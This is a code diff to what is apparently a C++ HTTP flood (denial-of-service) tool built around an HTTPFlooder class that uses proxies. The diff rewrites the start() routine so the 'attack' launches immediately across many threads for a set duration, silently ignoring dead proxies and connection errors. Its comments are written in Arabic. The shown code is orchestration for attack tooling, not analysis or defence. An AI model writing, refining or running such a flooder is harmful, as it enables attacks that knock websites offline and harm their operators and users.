@@ -227,41 +227,42 @@ bool connectProxy(socket_t sock, const std::string& pStr) {
         #endif
     }
     
-    void start() {
-        std::vector<std::thread> threads;
-        threads.reserve(threadCount);
-        
-        printBanner();
-        
-        for (int i = 0; i < threadCount; ++i) {
-            threads.emplace_back(&HTTPFlooder::floodWorker, this);
-            std::this_thread::sleep_for(std::chrono::microseconds(100));
-        }
-        
-        std::cout << "\nAll " << threadCount << " threads ready!" << std::endl;
-        std::cout << "Press [Enter] to start..." << std::flush;
-        std::cin.get();
-        
-        std::cout << "\nAttack started for " << duration << " seconds" << std::endl;
-        
-        {
-            std::lock_guard<std::mutex> lock(mtx_start);
-            running = true;
-        }
-        cv_start.notify_all();
-        
-        std::thread statsThread(&HTTPFlooder::monitorStats, this);
-        
-        std::this_thread::sleep_for(std::chrono::seconds(duration));
-        running = false;
-        
-        for (auto& t : threads) {
-            if (t.joinable()) t.join();
-        }
-        if (statsThread.joinable()) statsThread.join();
-        
-        printFinalStats();
+void start() {
+    std::vector<std::thread> threads;
+    printBanner();
+
+    {
+        std::lock_guard<std::mutex> lock(mtx_start);
+        running = true; 
     }
+
+    // تشغيل خيط الإحصائيات وفصله عن العملية الرئيسية فوراً
+    std::thread statsThread(&HTTPFlooder::monitorStats, this);
+    statsThread.detach(); 
+
+    for (int i = 0; i < threadCount; ++i) {
+        threads.emplace_back([this]() {
+            try {
+                this->floodWorker();
+            } catch (...) {
+                // تجاهل أي خطأ ناتج عن بروكسي أو اتصال ميت
+            }
+        });
+    }
+
+    std::cout << "\nAttack running for " << duration << " seconds..." << std::endl;
+    
+    // الانتظار حتى انتهاء الوقت
+    std::this_thread::sleep_for(std::chrono::seconds(duration));
+    running = false;
+
+    // إغلاق الخيوط بنظام
+    for (auto& t : threads) {
+        if (t.joinable()) t.join();
+    }
+    
+    printFinalStats();
+}
     
 private:
     void parseURL(const std::string& url) {
